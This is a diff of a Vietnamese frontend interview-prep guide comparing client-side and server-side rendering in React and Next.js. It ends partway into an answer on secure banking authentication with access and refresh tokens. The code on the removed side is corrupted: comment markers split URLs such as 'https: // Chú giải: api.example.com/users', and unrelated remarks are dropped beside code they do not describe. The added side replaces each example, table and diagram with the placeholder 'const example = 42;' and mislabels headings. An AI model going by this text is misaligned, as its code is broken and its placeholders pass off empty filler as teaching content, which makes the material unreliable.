-      ↓                 (500KB - 2MB)
-      ↓                 ⏱️  1-3 seconds
-      ↓
-[4] Browser parses & executes JS
-      ↓                 ⏱️  0.5-1 second
-      ↓
-[5] React renders virtual DOM
-      ↓
-[6] React makes API calls
-      ↓                 ⏱️  0.5-2 seconds
-      ↓
-[7] Data arrives → Re-render
-      ↓
-[8] User sees content
-      ↓                 ⏱️  Total: 3-5 seconds
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Code Example (React CSR):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: CSR Example - React App
- // Chú giải: ============================================
-
-// index.html - Minimal HTML (chỉ có div rỗng)
- // Chú giải: <!DOCTYPE html>
- // Chú giải: <html>
- // Chú giải: <head>
- // Chú giải: <title>My App</title>
- // Chú giải: </head>
- // Chú giải: <body>
- // Chú giải: <div id="root"></div>  ← EMPTY!
- // Chú giải: <script src="/bundle.js"></script>
- // Chú giải: </body>
- // Chú giải: </html>
-
- // Chú giải: main.tsx - Entry point
-import React from 'react';
-import ReactDOM from 'react-dom/client';
-import App from './App';
-
- // Chú giải: Render app on client
-const root = ReactDOM.createRoot(document.getElementById('root')!);
-root.render(<App />);
-
- // Chú giải: App.tsx - Main component
-import { useState, useEffect } from 'react';
-
-interface User {
-  id: number;
-  name: string;
-  email: string;
-}
-
-function App() {
-  const [users, setUsers] = useState<User[]>([]);
-  const [loading, setLoading] = useState(true);
-
- // Chú giải: Fetch data on client
-  useEffect(() => {
-    fetch('https: // Chú giải: api.example.com/users')
-      .then((res) => res.json())
-      .then((data) => {
-        setUsers(data);
-        setLoading(false);
-      });
-  }, []);
-
-  if (loading) {
-    return <div>Loading...</div>; // Chú giải: User sees loading state
-  }
-
-  return (
-    <div>
-      <h1>Users</h1>
-      <ul>
-        {users.map((user) => (
-          <li key={user.id}>
-            {user.name} - {user.email}
-          </li>
-        ))}
-      </ul>
-    </div>
-  );
-}
-
-export default App;
-
- // Chú giải: ============================================
- // Chú giải: What happens in browser:
- // Chú giải: ============================================
- // Chú giải: 1. Download HTML (5KB) - instant
- // Chú giải: 2. Download bundle.js (500KB) - 1-2 seconds
- // Chú giải: 3. Parse & execute JS - 0.5 seconds
- // Chú giải: 4. React renders <div>Loading...</div>
- // Chú giải: 5. Fetch API - 0.5-1 second
- // Chú giải: 6. Re-render with data
- // Chú giải: Total: 3-5 seconds until user sees content
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26560,147 +17256,25 @@ export default App;
 
 **Timeline:**
 
-```
-User clicks link
-      ↓
-[1] Browser → Server: GET /page
-      ↓
-[2] Server executes React
-      ↓
-[3] Server fetches data from DB
-      ↓                 ⏱️  0.1-0.5 seconds
-      ↓
-[4] Server renders HTML
-      ↓                 ⏱️  0.1-0.3 seconds
-      ↓
-[5] Server → Browser: Full HTML
-      ↓                 (50-200 KB)
-      ↓
-[6] Browser displays HTML immediately
-      ↓                 ⏱️  User sees content: 0.5-1 second
-      ↓
-[7] Browser downloads JS bundle
-      ↓                 (background)
-      ↓
-[8] Hydration - Make interactive
-      ↓                 ⏱️  0.5-1 second
-      ↓
-[9] Fully interactive
-      ↓                 ⏱️  Total interactive: 2-3 seconds
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Code Example (Next.js SSR):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: SSR Example - Next.js
- // Chú giải: ============================================
-
- // Chú giải: pages/users.tsx - SSR page
-import { GetServerSideProps } from 'next';
-
-interface User {
-  id: number;
-  name: string;
-  email: string;
-}
-
-interface Props {
-  users: User[];
-}
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-export const getServerSideProps: GetServerSideProps<Props> = async () => {
- // Chú giải: Fetch data on server
-  const res = await fetch('https: // Chú giải: api.example.com/users');
-  const users = await res.json();
-
- // Chú giải: Pass data to component as props
-  return {
-    props: {
-      users, // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-    },
-  };
-};
-
- // Chú giải: Component renders on server
-function UsersPage({ users }: Props) {
- // Chú giải: No loading state needed - data is already here!
-  return (
-    <div>
-      <h1>Users</h1>
-      <ul>
-        {users.map((user) => (
-          <li key={user.id}>
-            {user.name} - {user.email}
-          </li>
-        ))}
-      </ul>
-    </div>
-  );
-}
-
-export default UsersPage;
-
- // Chú giải: ============================================
- // Chú giải: What happens:
- // Chú giải: ============================================
- // Chú giải: 1. User requests /users
- // Chú giải: 2. Next.js server:
- // Chú giải: - Runs getServerSideProps()
- // Chú giải: - Fetches data from API
- // Chú giải: - Renders component to HTML string
- // Chú giải: - Sends full HTML to browser
- // Chú giải: 3. Browser displays HTML immediately (0.5-1s)
- // Chú giải: 4. JavaScript hydrates in background
- // Chú giải: 5. Page becomes interactive (2-3s total)
-
- // Chú giải: ============================================
- // Chú giải: HTML sent to browser (Full content!):
- // Chú giải: ============================================
- // Chú giải: <!DOCTYPE html>
- // Chú giải: <html>
- // Chú giải: <head>
- // Chú giải: <title>My App</title>
- // Chú giải: </head>
- // Chú giải: <body>
- // Chú giải: <div id="__next">
- // Chú giải: <div>
- // Chú giải: <h1>Users</h1>
- // Chú giải: <ul>
- // Chú giải: <li>John Doe - john@example.com</li>
- // Chú giải: <li>Jane Smith - jane@example.com</li>
- // Chú giải: <!-- Full content already rendered! -->
- // Chú giải: </ul>
- // Chú giải: </div>
- // Chú giải: </div>
- // Chú giải: <script src="/_next/static/bundle.js"></script>
- // Chú giải: </body>
- // Chú giải: </html>
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **📊 So Sánh Chi Tiết CSR vs SSR**
 
-```
-┌──────────────────────┬──────────────────────────┬──────────────────────────┐
-│ Tiêu Chí             │ CSR (Client-Side)        │ SSR (Server-Side)        │
-├──────────────────────┼──────────────────────────┼──────────────────────────┤
-│ Initial Load         │ ❌ 3-5 seconds           │ ✅ 0.5-1 second          │
-│ Time to Interactive  │ ✅ 3-5 seconds           │ ⚠️  2-3 seconds          │
-│ SEO                  │ ❌ Poor (empty HTML)     │ ✅ Excellent (full HTML) │
-│ Server Load          │ ✅ Low (serve static)    │ ❌ High (render per req) │
-│ Complexity           │ ✅ Simple                │ ❌ Complex               │
-│ Navigation Speed     │ ✅ Instant               │ ⚠️  Slower (re-render)   │
-│ Bundle Size          │ ❌ Large (500KB-2MB)     │ ⚠️  Medium (same JS)     │
-│ Blank Screen         │ ❌ Yes (before hydrate)  │ ✅ No (HTML ready)       │
-│ API Calls            │ ❌ Client (slow)         │ ✅ Server (fast)         │
-│ Caching              │ ✅ Easy (CDN)            │ ⚠️  Complex (per-user)   │
-│ Cost                 │ ✅ Low (CDN only)        │ ❌ High (servers)        │
-│ User Experience      │ ⚠️  Initial: Poor        │ ✅ Initial: Great        │
-│                      │ ✅ After load: Great     │ ⚠️  Navigation: OK       │
-└──────────────────────┴──────────────────────────┴──────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26709,72 +17283,16 @@ export default UsersPage;
 
 **✅ Dùng CSR khi:**
 
-```typescript
- // Chú giải: 1. Admin Dashboard / Internal Tools
-// - Không cần SEO
-// - User đã logged in
- // Chú giải: - Rich interactions
- // Chú giải: - Example: Analytics dashboard, CRM
-
- // Chú giải: 2. SPAs with Auth
- // Chú giải: - Dashboard, Settings
- // Chú giải: - User profile pages
- // Chú giải: - Tools, calculators
-
- // Chú giải: 3. Highly Interactive Apps
- // Chú giải: - Drawing apps
- // Chú giải: - Games
- // Chú giải: - Real-time collaboration tools
-
- // Chú giải: Example:
-const AdminDashboard = () => {
-  return (
-    <div>
-      <Chart data={realtimeData} /> {/* Real-time updates */}
-      <DataGrid onEdit={handleEdit} /> {/* Complex interactions */}
-    </div>
-  );
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **✅ Dùng SSR khi:**
 
-```typescript
- // Chú giải: 1. Public Content / Marketing
- // Chú giải: - Landing pages
- // Chú giải: - Blogs, News
- // Chú giải: - E-commerce product pages
- // Chú giải: - Example: Company website, Blog
-
- // Chú giải: 2. SEO-Critical Pages
- // Chú giải: - Product listings
- // Chú giải: - Article pages
- // Chú giải: - Search result pages
-
- // Chú giải: 3. Dynamic Content
- // Chú giải: - Personalized homepages
- // Chú giải: - Location-based content
- // Chú giải: - User-specific dashboards
-
- // Chú giải: Example:
-export const getServerSideProps = async (context) => {
- // Chú giải: Fetch based on user location
-  const { country } = context.req.geo;
-  const products = await fetchProductsByCountry(country);
-
-  return { props: { products } };
-};
-
-const ProductPage = ({ products }) => {
-  return (
-    <div>
-      <h1>Products in Your Region</h1>
-      {products.map((p) => (
-        <ProductCard key={p.id} {...p} />
-      ))}
-    </div>
-  );
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26783,52 +17301,9 @@ const ProductPage = ({ products }) => {
 
 Next.js còn có SSG (Static Site Generation) - best of both worlds:
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: SSG Example - Next.js
- // Chú giải: ============================================
-
- // Chú giải: Build time: Generate static HTML
-export const getStaticProps: GetStaticProps = async () => {
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  const res = await fetch('https: // Chú giải: api.example.com/posts');
-  const posts = await res.json();
-
-  return {
-    props: { posts },
-    revalidate: 60, // Chú giải: Re-generate every 60 seconds (ISR)
-  };
-};
-
- // Chú giải: Component
-const BlogPage = ({ posts }) => {
-  return (
-    <div>
-      <h1>Blog Posts</h1>
-      {posts.map((post) => (
-        <article key={post.id}>
-          <h2>{post.title}</h2>
-          <p>{post.excerpt}</p>
-        </article>
-      ))}
-    </div>
-  );
-};
-
- // Chú giải: ============================================
- // Chú giải: Benefits:
- // Chú giải: ============================================
- // Chú giải: ✅ Fast as CSR (served from CDN)
- // Chú giải: ✅ SEO-friendly like SSR
- // Chú giải: ✅ No server rendering cost
- // Chú giải: ✅ ISR (Incremental Static Regeneration)
-
- // Chú giải: Timeline:
- // Chú giải: [Build] Generate HTML → Deploy to CDN
- // Chú giải: ↓
- // Chú giải: [Request] CDN → Browser (instant!)
- // Chú giải: ↓
- // Chú giải: [Background] Re-validate every 60s
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26837,205 +17312,59 @@ const BlogPage = ({ posts }) => {
 
 **1. CSR Optimization:**
 
-```typescript
- // Chú giải: ✅ Code splitting
-import { lazy, Suspense } from 'react';
-
-const HeavyComponent = lazy(() => import('./HeavyComponent'));
-
-function App() {
-  return (
-    <Suspense fallback={<Loading />}>
-      <HeavyComponent />
-    </Suspense>
-  );
-}
-
- // Chú giải: ✅ Preload critical data
-<link rel="preload" href="/api/users" as="fetch" crossOrigin="anonymous" />
-
- // Chú giải: ✅ Service Worker caching
-if ('serviceWorker' in navigator) {
-  navigator.serviceWorker.register('/sw.js');
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **2. SSR Optimization:**
 
-```typescript
- // Chú giải: ✅ Cache rendered pages
-import { NextResponse } from 'next/server';
-
-export async function middleware(request) {
-  const response = NextResponse.next();
-  response.headers.set('Cache-Control', 'public, max-age=60, stale-while-revalidate=120');
-  return response;
-}
-
- // Chú giải: ✅ Streaming SSR (React 18)
-import { renderToReadableStream } from 'react-dom/server';
-
-const stream = await renderToReadableStream(<App />);
-return new Response(stream);
-
- // Chú giải: ✅ Selective hydration
-<div suppressHydrationWarning>{serverOnlyContent}</div>
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **3. Hybrid Strategy:**
 
-```typescript
- // Chú giải: ✅ Mix CSR + SSR + SSG
- // Chú giải: - SSG: Static pages (blog, docs)
- // Chú giải: - SSR: Dynamic pages (user profile)
- // Chú giải: - CSR: Interactive parts (comments, likes)
-
- // Chú giải: pages/post/[id].tsx
-export const getStaticProps = async ({ params }) => {
-  const post = await fetchPost(params.id); // Chú giải: SSG
-  return { props: { post } };
-};
-
-const PostPage = ({ post }) => {
-  return (
-    <div>
-      {/* SSG content */}
-      <article>{post.content}</article>
-
-      {/* CSR interactive part */}
-      <Comments postId={post.id} />
-      <LikeButton postId={post.id} />
-    </div>
-  );
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **🔍 Debugging & Measuring**
 
-```typescript
- // Chú giải: 1. Measure Time to First Byte (TTFB)
-performance.getEntriesByType('navigation')[0].responseStart;
-
- // Chú giải: 2. Measure First Contentful Paint (FCP)
-new PerformanceObserver((list) => {
-  for (const entry of list.getEntries()) {
-    console.log('FCP:', entry.startTime);
-  }
-}).observe({ entryTypes: ['paint'] });
-
- // Chú giải: 3. Detect SSR vs CSR
-const isSSR = typeof window === 'undefined';
-console.log('Rendering on:', isSSR ? 'Server' : 'Client');
-
- // Chú giải: 4. Chrome DevTools
- // Chú giải: - Network tab: Check HTML size (SSR = large, CSR = small)
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
- // Chú giải: - Lighthouse: Run audit for SSR vs CSR
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **❌ Common Mistakes**
 
-```typescript
- // Chú giải: ❌ MISTAKE 1: Using window/document in SSR
-function MyComponent() {
-  const width = window.innerWidth; // Chú giải: ❌ Error: window is not defined
-  return <div style={{ width }}></div>;
-}
-
- // Chú giải: ✅ FIX: Check environment
-function MyComponent() {
-  const [width, setWidth] = useState(0);
-
-  useEffect(() => {
-    if (typeof window !== 'undefined') {
-      setWidth(window.innerWidth);
-    }
-  }, []);
-
-  return <div style={{ width }}></div>;
-}
-
- // Chú giải: ❌ MISTAKE 2: Fetching data in useEffect for SSR
-export default function Page() {
-  const [data, setData] = useState(null);
-
-  useEffect(() => {
-    fetch('/api/data').then(/* ... */); // Chú giải: ❌ Runs on client!
-  }, []);
-
-  return <div>{data?.title}</div>;
-}
-
- // Chú giải: ✅ FIX: Use getServerSideProps
-export const getServerSideProps = async () => {
-  const data = await fetch('/api/data').then((r) => r.json());
-  return { props: { data } };
-};
-
-export default function Page({ data }) {
-  return <div>{data.title}</div>; // Chú giải: ✅ Data already available
-}
-
- // Chú giải: ❌ MISTAKE 3: Over-using SSR
- // Chú giải: Don't SSR everything - mix strategies!
-
- // Chú giải: ✅ GOOD: Strategic mix
- // Chú giải: - SSG: Blog posts, docs (static)
- // Chú giải: - SSR: User dashboard (dynamic)
- // Chú giải: - CSR: Admin panel (no SEO needed)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **📊 Real-world Performance Comparison**
 
-```typescript
- // Chú giải: Example: E-commerce Product Page
-
- // Chú giải: CSR (Create React App):
- // Chú giải: - Initial Load: 3.5 seconds
- // Chú giải: - Time to Interactive: 3.5 seconds
- // Chú giải: - Lighthouse Score: 40/100
- // Chú giải: - SEO: ❌ Poor (Google sees empty HTML)
-
- // Chú giải: SSR (Next.js):
- // Chú giải: - Initial Load: 1.2 seconds
- // Chú giải: - Time to Interactive: 2.8 seconds
- // Chú giải: - Lighthouse Score: 85/100
- // Chú giải: - SEO: ✅ Excellent (Google sees full content)
-
- // Chú giải: SSG (Next.js ISR):
- // Chú giải: - Initial Load: 0.5 seconds (CDN)
- // Chú giải: - Time to Interactive: 1.8 seconds
- // Chú giải: - Lighthouse Score: 95/100
- // Chú giải: - SEO: ✅ Excellent + fast delivery
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **🎯 Decision Tree**
 
-```
-Start
-  ↓
-SEO needed?
-  ├─ No → CSR (React, Vue, Angular SPA)
-  │
-  └─ Yes → Content changes frequently?
-           ├─ No → SSG (Next.js, Gatsby)
-           │        - Blog, docs, marketing
-           │
-           └─ Yes → Per-user content?
-                    ├─ No → SSR with cache
-                    │        - News, products
-                    │
-                    └─ Yes → SSR + ISR
-                             - User dashboards
-                             - Personalized pages
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -27062,17 +17391,9 @@ SEO needed?
 
 **Modern Approach:**
 
-```typescript
- // Chú giải: Mix all three strategies!
- // Chú giải: - SSG for static pages (blog, docs)
- // Chú giải: - SSR for dynamic pages (user profile, search)
- // Chú giải: - CSR for interactive parts (comments, likes)
-
- // Chú giải: Example: E-commerce site
- // Chú giải: - Homepage: SSG (revalidate hourly)
- // Chú giải: - Product page: SSR (real-time inventory)
- // Chú giải: - Cart: CSR (no SEO needed)
- // Chú giải: - Checkout: SSR (security + UX)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Key Takeaway:**
@@ -27083,22 +17404,20 @@ SEO needed?
 - SEO + Performance = SSR/SSG
 - Interactivity + Simple = CSR
 
-
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
-💧 Hydration là quá trình Server render ra HTML → Browser hiển thị ngay → Sau đó React “gắn” event listeners vào HTML → UI trở nên tương tác được.
 
-"Hydration là bước React biến HTML do SSR hoặc SSG render sẵn thành UI có thể tương tác, bằng cách attach event listeners và khôi phục state.
-
-HTML từ server ngay lập tức giúp cải thiện SEO và First Contentful Paint, còn hydration giúp UI hoạt động như SPA. Thách thức lớn nhất là tránh hydration mismatch và tối ưu cost hydration trong các trang lớn bằng techniques như partial/lazy hydration.
-```
 ---
-## 43. 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security  
 
-**P1: Tên câu hỏi:** 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security  
+## 45. Q45: 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 46. Q46: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
 
@@ -27119,14 +17438,10 @@ HTML từ server ngay lập tức giúp cải thiện SEO và First Contentful P
 - **Dùng để**: Lấy access token mới khi expired
 
 **3. Authentication Flow:**
-```
-Login → Server return:
-  - Access Token (response body)
-  - Refresh Token (httpOnly cookie)
-→ Client lưu access token in memory
-→ API calls với access token
-→ Token expired (15min) → call /refresh endpoint
-→ Server verify refresh token (cookie) → return new access token
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **4. Security Measures:**
@@ -27155,38 +17470,9 @@ Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo m�
 
 #### **📊 Tổng Quan Authentication Flow**
 
-```
-┌────────────────────────────────────────────────────────────────────┐
-│              SECURE AUTHENTICATION FLOW                            │
-│        (Banking/Trading System - Hệ Thống Ngân Hàng)              │
-├────────────────────────────────────────────────────────────────────┤
-│                                                                    │
-│  🔑 ACCESS TOKEN                                                   │
-│  ┌──────────────────────────────────────────────────────────────┐ │
-│  │ • Thời hạn: 15 phút (ngắn)                                   │ │
-│  │ • Lưu ở: Memory (JavaScript variable)                       │ │
-│  │ • Dùng để: Gọi API (Authorization: Bearer <token>)          │ │
-│  │ • Mất khi: Refresh page (phải lấy lại)                      │ │
-│  │ • Bảo mật: Không lưu localStorage (XSS risk)                │ │
-│  └──────────────────────────────────────────────────────────────┘ │
-│                                                                    │
-│  🔄 REFRESH TOKEN                                                  │
-│  ┌──────────────────────────────────────────────────────────────┐ │
-│  │ • Thời hạn: 7-30 ngày (dài)                                  │ │
-│  │ • Lưu ở: httpOnly Cookie (server-side chỉ đọc được)         │ │
-│  │ • Dùng để: Lấy Access Token mới khi hết hạn                 │ │
-│  │ • Bảo mật: httpOnly + Secure + SameSite=Strict              │ │
-│  │ • Không đọc được bởi JavaScript (chống XSS)                 │ │
-│  └──────────────────────────────────────────────────────────────┘ │
-│                                                                    │
-│  🍪 SESSION COOKIE (Optional - cho Banking)                       │
-│  ┌──────────────────────────────────────────────────────────────┐ │
-│  │ • Thời hạn: Session (đóng browser = mất)                    │ │
-│  │ • Lưu ở: httpOnly Cookie                                    │ │
-│  │ • Dùng để: Session ID (server tracking)                     │ │
-│  │ • Bảo mật: httpOnly + Secure                                │ │
-│  └──────────────────────────────────────────────────────────────┘ │
-└────────────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -27195,81 +17481,23 @@ Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo m�
 
 **Access Token (Token Truy Cập):**
 
-```typescript
-// Cấu trúc JWT Access Token
-{
-  "header": {
-    "alg": "RS256",      // Thuật toán mã hóa (RSA + SHA256)
-    "typ": "JWT"
-  },
-  "payload": {
-    "sub": "user123", // Chú giải: User ID
-    "name": "John Doe",
-    "email": "john@example.com",
-    "role": "trader", // Chú giải: Role: admin, trader, customer
-    "permissions": ["trade", "view_balance", "transfer"],
-    "iat": 1699999999,   // Issued At (thời điểm tạo)
-    "exp": 1700000899    // Expiry (hết hạn sau 15 phút)
-  },
-  "signature": "..."     // Chữ ký số (verify token không bị giả mạo)
-}
-
-// Đặc điểm:
-// ✅ Thời hạn ngắn: 5-15 phút
- // Chú giải: ✅ Lưu trong memory (JavaScript variable)
-// ✅ Gửi kèm mọi API request: Authorization: Bearer <token>
-// ✅ Chứa thông tin user (role, permissions)
-// ❌ KHÔNG lưu localStorage/sessionStorage (XSS risk)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Refresh Token (Token Làm Mới):**
 
-```typescript
-// Cấu trúc Refresh Token (thường là random string)
-{
-  "jti": "unique-token-id-abc123xyz", // Chú giải: Token ID duy nhất
-  "sub": "user123", // Chú giải: User ID
-  "iat": 1699999999, // Chú giải: Issued At
-  "exp": 1702591999                    // Expiry (hết hạn sau 30 ngày)
-}
-
-// Đặc điểm:
-// ✅ Thời hạn dài: 7-30 ngày (hoặc vô thời hạn)
-// ✅ Lưu trong httpOnly Cookie (không đọc được bằng JS)
-// ✅ Chỉ dùng để lấy Access Token mới
-// ✅ Có thể revoke (thu hồi) từ server
-// ❌ KHÔNG gửi kèm API thường (chỉ gửi tới /refresh endpoint)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Tại Sao Cần 2 Token?**
 
-```
-┌────────────────────────────────────────────────────────────┐
-│                    TẠI SAO CẦN 2 TOKEN?                    │
-├────────────────────────────────────────────────────────────┤
-│                                                            │
-│  Scenario 1: Chỉ dùng 1 Access Token dài hạn              │
-│  ┌──────────────────────────────────────────────────────┐ │
-│  │ ❌ Nếu token bị leak (XSS, network sniffing)         │ │
-│  │    → Hacker có 30 ngày để dùng token                 │ │
-│  │    → Không thể thu hồi (revoke)                      │ │
-│  │    → RỦI RO CỰC CAO!                                 │ │
-│  └──────────────────────────────────────────────────────┘ │
-│                                                            │
-│  Scenario 2: Dùng Access Token (15 phút) + Refresh Token  │
-│  ┌──────────────────────────────────────────────────────┐ │
-│  │ ✅ Access Token bị leak                              │ │
-│  │    → Chỉ dùng được 15 phút                           │ │
-│  │    → Tự động hết hạn                                 │ │
-│  │                                                       │ │
-│  │ ✅ Refresh Token bị leak                             │ │
-│  │    → Lưu httpOnly cookie (khó bị XSS)               │ │
-│  │    → Server có thể revoke (blacklist)               │ │
-│  │    → Có thể detect suspicious activity               │ │
-│  │                                                       │ │
-│  │ → RỦI RO THẤP HƠN NHIỀU!                             │ │
-│  └──────────────────────────────────────────────────────┘ │
-└────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -27278,432 +17506,36 @@ Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo m�
 
 **A. Login Flow (Đăng Nhập):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: BƯỚC 1: User Login
- // Chú giải: ============================================
-
- // Chú giải: Frontend: Gửi username + password
-async function login(username: string, password: string) {
-  try {
-    const response = await fetch('https: // Chú giải: api.bank.com/auth/login', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        username,
-        password,
- // Chú giải: Optional: MFA code, device fingerprint
-        mfaCode: '123456',
-        deviceId: getDeviceFingerprint(),
-      }),
-      credentials: 'include', // Quan trọng: Cho phép gửi/nhận cookie
-    });
-
-    if (!response.ok) {
-      throw new Error('Login failed');
-    }
-
-    const data = await response.json();
-    
- // Chú giải: {
- // Thu gom rác tự động: runtime đánh dấu và quét các object không còn truy cập để giải phóng bộ nhớ.
- // Chú giải: user: { id: "123", name: "John", role: "trader" },
-    //   expiresIn: 900  // 15 phút (900 giây)
- // Chú giải: }
-    
-    // Refresh Token được server tự động set vào httpOnly cookie
- // Chú giải: Set-Cookie: refreshToken=xyz...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
-    
-    return data;
-  } catch (error) {
-    console.error('Login error:', error);
-    throw error;
-  }
-}
-
- // Chú giải: ============================================
-// BƯỚC 2: Server Xử Lý Login
- // Chú giải: ============================================
-
- // Chú giải: Backend (Node.js/Express)
-app.post('/auth/login', async (req, res) => {
-  const { username, password, mfaCode } = req.body;
-  
- // Chú giải: 1. Verify username + password (bcrypt)
-  const user = await db.findUserByUsername(username);
-  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
-    return res.status(401).json({ error: 'Invalid credentials' });
-  }
-  
- // Chú giải: 2. Verify MFA (Multi-Factor Authentication)
-  if (!verifyMFA(user, mfaCode)) {
-    return res.status(401).json({ error: 'Invalid MFA code' });
-  }
-  
- // Chú giải: 3. Check account status (not locked, not suspended)
-  if (user.isLocked || user.isSuspended) {
-    return res.status(403).json({ error: 'Account locked' });
-  }
-  
-  // 4. Generate Access Token (15 phút)
-  const accessToken = jwt.sign(
-    {
-      sub: user.id,
-      name: user.name,
-      email: user.email,
-      role: user.role,
-      permissions: user.permissions,
-    },
-    process.env.ACCESS_TOKEN_SECRET, // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-    { expiresIn: '15m' }  // 15 phút
-  );
-  
-  // 5. Generate Refresh Token (30 ngày)
-  const refreshToken = jwt.sign(
-    {
-      jti: uuidv4(), // Chú giải: Unique token ID
-      sub: user.id,
-    },
-    process.env.REFRESH_TOKEN_SECRET,
-    { expiresIn: '30d' }  // 30 ngày
-  );
-  
-  // 6. Lưu Refresh Token vào database (để có thể revoke sau)
-  await db.saveRefreshToken({
-    tokenId: refreshToken.jti,
-    userId: user.id,
-    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
-    deviceInfo: req.headers['user-agent'],
-    ipAddress: req.ip,
-  });
-  
-  // 7. Set Refresh Token vào httpOnly Cookie
-  res.cookie('refreshToken', refreshToken, {
-    httpOnly: true,    // JavaScript không đọc được (chống XSS)
-    secure: true, // Chú giải: Chỉ gửi qua HTTPS
-    sameSite: 'strict', // Chú giải: Chống CSRF
-    maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngày
-    path: '/auth/refresh', // Chú giải: Chỉ gửi tới endpoint refresh
-  });
-  
- // Chú giải: 8. Log login event (audit trail)
-  await logEvent({
-    type: 'LOGIN_SUCCESS',
-    userId: user.id,
-    ipAddress: req.ip,
-    deviceInfo: req.headers['user-agent'],
-    timestamp: new Date(),
-  });
-  
-  // 9. Return Access Token về client
-  res.json({
-    accessToken,
-    user: {
-      id: user.id,
-      name: user.name,
-      email: user.email,
-      role: user.role,
-    },
-    expiresIn: 900,  // 15 phút
-  });
-});
-
- // Chú giải: ============================================
- // Chú giải: BƯỚC 3: Frontend Lưu Access Token
- // Chú giải: ============================================
-
- // Chú giải: Store Access Token in memory (JavaScript variable)
-let accessToken: string | null = null;
-
-async function handleLogin(username: string, password: string) {
-  const response = await login(username, password);
-  
- // Chú giải: Lưu Access Token trong memory
-  accessToken = response.accessToken;
-  
-  // Lưu user info (không sensitive) vào localStorage
-  localStorage.setItem('user', JSON.stringify(response.user));
-  
- // Chú giải: Redirect to dashboard
-  window.location.href = '/dashboard';
-}
-
-// ❌ KHÔNG BAO GIỜ LÀM NHƯ NÀY:
- // Chú giải: localStorage.setItem('accessToken', token);  // XSS risk!
- // Chú giải: sessionStorage.setItem('accessToken', token); // Vẫn XSS risk!
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **B. API Call Flow (Gọi API với Access Token):**
 
-```typescript
- // Chú giải: ============================================
- // Chú giải: Frontend: Gọi API với Access Token
- // Chú giải: ============================================
-
-// Helper function: Tự động attach Access Token
-async function apiCall(url: string, options: RequestInit = {}) {
-  // Nếu Access Token hết hạn → refresh trước
-  if (isTokenExpired(accessToken)) {
-    await refreshAccessToken();
-  }
-  
- // Chú giải: Gửi request với Access Token
-  const response = await fetch(url, {
-    ...options,
-    headers: {
-      ...options.headers,
-      'Authorization': `Bearer ${accessToken}`, // Chú giải: Gửi token
-    },
-    credentials: 'include', // Chú giải: Gửi cookies (refresh token)
-  });
-  
-  // Nếu 401 Unauthorized → token invalid, logout
-  if (response.status === 401) {
-    await logout();
-    window.location.href = '/login';
-    throw new Error('Unauthorized');
-  }
-  
-  return response.json();
-}
-
-// Usage: Gọi API lấy số dư tài khoản
